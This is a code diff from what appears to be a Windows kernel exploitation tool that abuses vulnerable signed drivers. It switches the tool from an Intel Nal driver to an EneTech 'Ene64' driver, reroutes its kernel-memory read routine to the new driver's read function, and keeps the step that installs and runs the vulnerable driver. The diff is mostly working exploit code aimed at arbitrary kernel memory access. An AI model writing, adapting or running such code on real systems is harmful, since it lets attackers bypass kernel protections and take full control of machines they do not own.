@@ -20,8 +20,8 @@
 
 #pragma comment(lib, "version.lib")
 
-#define PROVIDER_NAME   L"IntelNal"
-#define PROVIDER_DEVICE L"Nal"
+#define PROVIDER_NAME   L"Ene64"
+#define PROVIDER_DEVICE L"EneTechIo"
 
 //
 // Provider version we expect.
@@ -33,26 +33,6 @@
 
 BOOLEAN g_DriverAlreadyLoaded = FALSE;
 
-/*
-* VirtualToPhysical
-*
-* Purpose:
-*
-* Provider wrapper for VirtualToPhysical routine.
-*
-*/
-BOOL WINAPI VirtualToPhysical(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR VirtualAddress,
-    _Out_ ULONG_PTR* PhysicalAddress)
-{
-    printf_s("%s(%p, 0x%llx, OutParam)\r\n",
-        __FUNCTION__, DeviceHandle, VirtualAddress);
-
-    return NalVirtualToPhysical(DeviceHandle,
-        VirtualAddress,
-        PhysicalAddress);
-}
 
 /*
 * ReadKernelVM
@@ -68,6 +48,8 @@ BOOL WINAPI ReadKernelVM(
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
+    ULONG ReadBytes = 0;
+
     printf_s("%s(%p, 0x%llx, 0x%p, %lu)\r\n",
         __FUNCTION__, DeviceHandle, Address, Buffer, NumberOfBytes);
 
@@ -77,10 +59,16 @@ BOOL WINAPI ReadKernelVM(
         return FALSE;
     }
 
-    return NalReadVirtualMemoryEx(DeviceHandle,
+    return WinIoReadSystemMemoryEx(DeviceHandle,
         Address,
         Buffer,
-        NumberOfBytes);
+        NumberOfBytes,
+        &ReadBytes);
+
+   /* return NalReadVirtualMemoryEx(DeviceHandle,
+        Address,
+        Buffer,
+        NumberOfBytes);*/
 }
 
 /*
@@ -507,7 +495,7 @@ BOOL ProviderCreate(
         //
         // Install and run vulnerable driver.
         //
-        deviceHandle = StartVulnerableDriver(IDR_iQVM64,
+        deviceHandle = StartVulnerableDriver(IDR_ENETECH64,
             hInstance,
             PROVIDER_NAME,
             PROVIDER_DEVICE,
@@ -571,13 +559,13 @@ BOOL TestRead()
         printf_s("[<] Leaving %s\r\n", __FUNCTION__);
         return FALSE;
     }
-
+/*
     if (NalEnableDbgPrint(providerHandle, TRUE)) {
         printf_s("LDR: Debug print enabled for Intel Nal\r\n");
     }
     else {
         printf_s("[!] Could not enable debug print for Intel Nal\r\n");
-    }
+    }*/
 
     RtlZeroMemory(&fileObject, sizeof(fileObject));
     RtlZeroMemory(&deviceObject, sizeof(deviceObject));
